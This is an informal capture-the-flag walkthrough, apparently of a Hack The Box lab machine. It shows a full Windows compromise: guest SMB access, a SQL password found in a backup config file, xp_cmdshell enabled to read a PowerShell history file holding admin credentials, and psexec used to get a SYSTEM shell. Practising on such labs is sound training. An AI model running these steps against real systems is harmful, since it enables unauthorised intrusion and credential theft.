=====================================================================================
1. Port 445 is open the user is defined as "Guest"
```bash  
smbclient -L \\10.129.95.187\\ -U 'guest'
Password for [WORKGROUP\guest]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backups         Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.95.187 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
======================================================================================
2. Check the additional share name.
```bash
mbclient //10.129.95.187/backups -U 'guest'
Password for [WORKGROUP\guest]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Mon Jan 20 17:50:57 2020
  ..                                  D        0  Mon Jan 20 17:50:57 2020
  prod.dtsConfig                     AR      609  Mon Jan 20 17:53:02 2020

                5056511 blocks of size 4096. 2611322 blocks available
smb: \> get prod.config
NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \prod.config
smb: \> get prod.dtsConfig 
getting file \prod.dtsConfig of size 609 as prod.dtsConfig (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
smb: \>
```
==========================================================================================
3. There is something inside of it.
```bash
┌──(sabeshan㉿kali)-[~/HTB/startpoint]
└─$ cat prod.dtsConfig 
<DTSConfiguration>
    <DTSConfigurationHeading>
        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>
</DTSConfiguration>
```
===============================================================================================
4. It enters to a mssql 
```bash
impacket-mssqlclient ARCHETYPE/sql_svc@10.129.95.187 -windows-auth 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'.
[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
SQL (ARCHETYPE\sql_svc  dbo@master)>
```
===================================================================================================
5. Get the initial access with xp_cmdshell
```bash
->EXEC sp_configure 'show advanced options', 1;
->RECONFIGURE;
->sp_configure; - Enabling the sp_configure as stated in the above error message
->EXEC sp_configure 'xp_cmdshell', 1;
->RECONFIGURE;
first of all we need to configure the system to cmdshell then we can achieve our exlpoits.
after running the winpeas on the system i can gain the admin creds
SQL (ARCHETYPE\sql_svc  dbo@master)> xp_cmdshell "powershell -c type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
output                                                                    
-----------------------------------------------------------------------   
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!   

exit                                                                      

NULL                                                                      

SQL (ARCHETYPE\sql_svc  dbo@master)>
```
==========================================================================================================
6.Finally i got the system in the machine
```bash
impacket-psexec Administrator@10.129.95.187                        
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Requesting shares on 10.129.95.187.....
[*] Found writable share ADMIN$
[*] Uploading file vwNHnXzm.exe
[*] Opening SVCManager on 10.129.95.187.....
[*] Creating service nRpj on 10.129.95.187.....
[*] Starting service nRpj.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.2061]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```
==============================================================================================================

